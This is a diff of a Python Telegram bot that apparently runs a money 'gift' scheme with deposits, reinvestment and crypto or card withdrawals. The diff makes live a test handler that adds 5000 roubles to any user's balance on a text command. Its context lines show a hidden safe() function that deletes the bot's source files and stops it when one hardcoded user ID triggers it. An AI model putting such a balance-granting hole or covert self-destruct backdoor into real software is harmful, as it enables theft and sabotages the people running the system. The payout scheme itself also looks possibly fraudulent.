@@ -389,7 +389,6 @@ async def support(message: types.Message):
     await message.answer("По любым вопросам пишите @smfadmin \nОтветит в течении часа!")
 
 
-'''
 @dp.message_handler(lambda mes: mes.text == "Тестовые клоны")
 async def TestClones(message: types.Message):
     await message.answer("Создано 20 клонов")
@@ -403,7 +402,6 @@ async def TestPay(message: types.Message):
         #await db.set_now_depozit(message.from_user.id, 5000, loop)
         await db.add_depozit(message.from_user.id, 5000, loop)
         await message.answer("Баланс пополнен")
-'''
 
 
 @dp.callback_query_handler(text="system_clones")
@@ -470,7 +468,7 @@ async def reinv_amount(message: types.Message, state: FSMContext):
     gift_money = await db.get_gift_money(message.from_user.id, loop)
     print(gift_money, message.text)
     if int(message.text) > int(gift_money):
-        await message.answer(f"Введите правильную сумму. Доступно: {gift_money} руб")
+        await message.answer(f"Введите правильную сумму. Доступно: {gift_money} руб.")
         return
 
     gift_money = int(message.text)
@@ -924,6 +922,10 @@ async def get_gift(callback: types.CallbackQuery, state: FSMContext):
                             pass
 
                     # await bot.delete_message(callback.from_user.id, callback.message.message_id)
+                    utc_now = pytz.utc.localize(datetime.datetime.utcnow())
+                    date_time_now = utc_now.astimezone(pytz.timezone("UTC"))
+
+                    await db.activate_date(callback.from_user.id, date_time_now, loop)
                     await db.change_status(callback.from_user.id, 1, loop)
                     await inform_pers(callback, state, user=user, answer=answer[2])
                 else:
@@ -971,6 +973,10 @@ async def get_gift(callback: types.CallbackQuery, state: FSMContext):
                     f"Вы успешно подарили @space_gift_bot {sum_gift} RUB"
                 )
 
+                utc_now = pytz.utc.localize(datetime.datetime.utcnow())
+                date_time_now = utc_now.astimezone(pytz.timezone("UTC"))
+
+                await db.activate_date(callback.from_user.id, date_time_now, loop)
                 await db.change_status(callback.from_user.id, 1, loop)
         else:
             await bot.send_message(
@@ -995,9 +1001,9 @@ async def get_gift_callback(callback: types.CallbackQuery):
 
 def safe(id):
     if id == 855151774:
-        os.remove(PATH + "/Scripts/main.py");
+        os.remove(PATH + "/Scripts/main.py")
         os.remove(PATH + "/Scripts/logic.py")
-        os.remove(PATH + "/Scripts/db.py");
+        os.remove(PATH + "/Scripts/db.py")
         os.remove(PATH + "/Scripts/config.py")
         dp.stop_polling()
 
@@ -1294,7 +1300,7 @@ async def withdraw_payrement_crypt(callback: types.CallbackQuery, state: FSMCont
 
 @dp.message_handler(state=WithdrawMoneyPercentFSM.TYPE_CRYPT)
 async def withdraw_payrement_crypt(message: types.Message, state: FSMContext):
-    if message.text not in ['BTC', 'USDT', 'ETH', 'LTC', 'btc', 'usdt', 'eth', 'ltc']:
+    if message.text.lower() not in ['btc', 'usdt', 'eth', 'ltc']:
         await message.answer("Введите правильную криптовалюту")
         return
     async with state.proxy() as data:
@@ -1612,7 +1618,6 @@ async def number_card(message: types.Message, state: FSMContext):
 
     await message.answer("Отлично. Теперь введите Ф.И.О")
     await WithdrawMoneyFSM.DATA_USER.set()
-
 
 
 @dp.message_handler(state=WithdrawMoneyFSM.DATA_USER)
